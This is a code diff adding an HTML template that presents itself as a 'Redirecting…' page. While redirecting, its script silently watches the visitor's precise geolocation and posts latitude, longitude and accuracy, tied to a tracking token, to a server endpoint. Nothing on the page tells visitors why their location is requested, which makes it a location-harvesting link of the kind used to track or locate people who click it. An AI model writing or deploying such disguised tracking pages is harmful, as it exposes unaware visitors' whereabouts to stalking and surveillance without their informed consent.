@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Redirecting…</title>
+  <style>
+    html, body { margin: 0; min-height: 100%; background: #0a0b0f; color: #c5cad6;
+      font-family: system-ui, -apple-system, sans-serif; box-sizing: border-box; }
+    body { display: flex; align-items: center; justify-content: center; padding: 1.5rem; }
+    .continue-msg { max-width: 22rem; text-align: center; line-height: 1.55; font-size: 0.95rem; margin: 0; }
+  </style>
+  <noscript><meta http-equiv="refresh" content="0;url={{ url_for('finish_visit', token=token) }}"></noscript>
+</head>
+<body>
+  <p class="continue-msg" id="msg"></p>
+  <script>
+  (function () {
+    var token = {{ token|tojson }};
+    var postUrl = {{ url_for('finish_visit')|tojson }};
+    var trackUrl = {{ url_for('visit_track')|tojson }};
+    var finishGet = {{ url_for('finish_visit', token=token)|tojson }};
+    var done = false;
+    var watchId = null;
+    var started = Date.now();
+    var firstFixAt = null;
+    var lastSent = 0;
+    var throttleMs = 2500;
+    var maxWaitNoFixMs = 22000;
+    var afterFixMs = 4000;
+    var tickTimer = null;
+
+    function finish(extra) {
+      if (done) return;
+      done = true;
+      if (watchId !== null && navigator.geolocation) {
+        try { navigator.geolocation.clearWatch(watchId); } catch (e) {}
+        watchId = null;
+      }
+      if (tickTimer !== null) {
+        clearInterval(tickTimer);
+        tickTimer = null;
+      }
+      fetch(postUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(Object.assign({ token: token }, extra || {}))
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          if (data && data.redirect) {
+            window.location.replace(data.redirect);
+            return;
+          }
+          throw new Error('bad');
+        })
+        .catch(function () {
+          window.location.href = finishGet;
+        });
+    }
+
+    function sendTrack(pos) {
+      var now = Date.now();
+      if (now - lastSent < throttleMs) return;
+      lastSent = now;
+      fetch(trackUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          token: token,
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }),
+        keepalive: true
+      }).catch(function () {});
+    }
+
+    function maybeFinish() {
+      if (done) return;
+      var now = Date.now();
+      var elapsed = now - started;
+      if (firstFixAt !== null && (now - firstFixAt >= afterFixMs)) {
+        finish({});
+        return;
+      }
+      if (firstFixAt === null && elapsed >= maxWaitNoFixMs) {
+        finish({});
+      }
+    }
+
+    if (!navigator.geolocation) {
+      finish({});
+      return;
+    }
+
+    tickTimer = setInterval(maybeFinish, 350);
+
+    watchId = navigator.geolocation.watchPosition(
+      function (pos) {
+        if (firstFixAt === null) firstFixAt = Date.now();
+        sendTrack(pos);
+      },
+      function () {
+        if (firstFixAt === null && !done) {
+          setTimeout(function () { finish({}); }, 600);
+        }
+      },
+      { enableHighAccuracy: true, maximumAge: 0, timeout: 12000 }
+    );
+  })();
+  </script>
+</body>
+</html>
